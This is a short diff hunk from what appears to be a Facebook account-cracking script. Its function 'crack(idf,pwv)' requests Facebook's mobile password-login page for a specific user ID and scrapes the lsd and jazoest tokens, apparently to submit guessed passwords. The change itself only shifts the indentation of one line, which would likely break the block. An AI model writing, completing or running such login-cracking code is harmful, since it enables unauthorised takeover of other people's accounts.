@@ -488,7 +488,7 @@ def crack(idf,pwv):
                     "accept-encoding":"gzip, deflate br",
                     "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                 })
-                r = session.get('https://m.facebook.com/login/device-based/password/?uid=100075753536897&flow=login_no_pin&refsrc=deprecated&_rdr')
+                 r = session.get('https://m.facebook.com/login/device-based/password/?uid=100075753536897&flow=login_no_pin&refsrc=deprecated&_rdr')
                 das = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                     "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
